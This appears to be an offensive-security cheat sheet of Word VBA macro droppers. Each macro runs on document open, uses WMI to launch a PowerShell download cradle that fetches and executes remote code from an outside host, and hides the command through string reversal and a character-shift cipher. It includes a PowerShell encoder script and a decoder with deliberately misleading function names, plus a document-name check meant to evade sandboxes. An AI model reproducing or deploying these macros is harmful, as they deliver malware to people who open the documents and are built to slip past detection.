#### PowerShell Download Cradle with WMI plus Basic Obfuscation
```vba
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String
    strArg = bears("))'txt.nur/1.1.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
    GetObject(bears(":stmgmniw").Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

# With Complex Obfuscation

#### Encryption using PowerShell
```powershell
$payload = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.1/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

Output goes into the clipboard

Paste in Cradle

#### Encrypted Download Cradle
```vba
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Sub MyMacro()
    Dim Apples As String
    Dim Water As String
    
    ' Heauristic Detection
    ' 131134127127118131063117128116 = runner.doc
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    ' Download Cradle
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066063066064131134127063133137133056058058")
    
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075").Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```